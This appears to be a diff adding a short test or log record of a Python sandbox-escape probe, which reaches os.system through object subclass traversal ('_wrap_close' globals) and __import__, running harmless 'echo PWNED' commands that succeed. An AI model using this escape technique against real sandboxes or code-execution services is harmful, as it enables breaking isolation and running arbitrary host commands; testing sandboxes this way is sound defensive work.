@@ -1,0 +1,11 @@
+config: get_environment('ipython', {'kernel_mode': 'subprocess', 'cell_timeout': 30})
+code:
+subs = ().__class__.__base__.__subclasses__()
+wc = [c for c in subs if c.__name__ == '_wrap_close']
+print(len(subs), len(wc))
+print(__import__('os').system('echo PWNED'))
+print(wc[0].__init__.__globals__['system']('echo PWNED2'))
+result: {'ok': True, 'stdout': '810 1\nPWNED\n0\nPWNED2\n0\n', 'stderr': '', 's': 0.06}
+host-side lookup calls: 0
+host pid: 25459
+wall: 0.23 s
